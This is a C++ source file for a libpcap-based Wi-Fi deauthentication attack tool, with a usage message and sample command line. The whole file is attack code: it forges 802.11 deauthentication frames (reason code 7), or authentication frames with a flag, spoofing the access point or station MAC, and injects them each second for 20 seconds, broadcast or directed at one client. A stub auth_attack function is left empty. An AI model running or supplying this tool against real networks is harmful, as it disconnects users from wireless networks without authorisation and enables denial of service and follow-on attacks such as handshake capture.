#include <iostream>
#include <string>
#include <pcap.h>
#include <unistd.h>
#include <time.h>
#include "mac.h"
#include "main.h"
using namespace std;

void usage()
{
    cout << "syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]]\n";
    cout << "sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB" << endl;
}

void deauth_attack(pcap_t *handle, Mac ap_mac, Mac station_mac, bool auth)
{
    deauthPacket dP;
    dP.radio.it_version = 0;
    dP.radio.it_pad = 0;
    dP.radio.it_len = sizeof(radiotapHdr);
    dP.radio.it_present = 0x00008004;
    dP.radio.data_rate = 0x02;
    dP.radio.zero = 0x00;
    dP.radio.tx = 0x0018;

    dP.beacon.type = auth ? 0xb0 : 0xc0;
    dP.beacon.flags = 0;
    dP.beacon.duration = 0;
    dP.beacon.dest = auth? ap_mac : station_mac;
    dP.beacon.src = auth? station_mac : ap_mac;
    dP.beacon.bssid = ap_mac;
    dP.beacon.seq = 0;
    dP.reasonCode = 0x0007; // Class 3 frame received from nonassociated STA

    for (int i = 0; i < 20; i++) // Try 20 seconds
    {
        time_t rawtime;
        struct tm *timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        printf("%02d:%02d:%02d ", timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);
        if (auth)
        {
            cout << "Sending Auth from station -- STMAC: [" << string(station_mac) << "]\n";
        }
        else
        {
            if (station_mac == Mac::broadcastMac())
                cout << "Sending DeAuth (code 7) to broadcast -- BSSID: [" << string(ap_mac) << "]\n";
            else
                cout << "Sending directed DeAuth (code 7) -- STMAC: [" << string(station_mac) << "]\n";
        }
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&dP), sizeof(dP));
        if (res != 0)
        {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        if (station_mac != Mac::broadcastMac() && !auth) // Send Station Unitcast
        {
            Mac temp = dP.beacon.src;
            dP.beacon.src = dP.beacon.dest;
            dP.beacon.dest = temp;
            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&dP), sizeof(dP));
            if (res != 0)
            {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
        }
        sleep(1); // Sleep 1 second before sending
    }
}

void auth_attack(pcap_t *handle, Mac ap_mac, Mac station_mac)
{
}

int main(int argc, char *argv[])
{
    // Parse Arguments
    if (argc != 3 && argc != 4 && argc != 5)
    {
        usage();
        return -1;
    }

    char *dev = argv[1];
    Mac ap_mac = Mac(argv[2]);
    Mac station_mac = Mac::broadcastMac();
    bool auth = false;

    if (argc >= 4)
        station_mac = Mac(argv[3]);
    if (argc == 5)
        if (string(argv[4]) == "-auth")
            auth = true;
        else
        {
            usage();
            return -1;
        }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 100, errbuf);
    if (handle == NULL)
    {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    deauth_attack(handle, ap_mac, station_mac, auth);

    pcap_close(handle);
    return true;
}
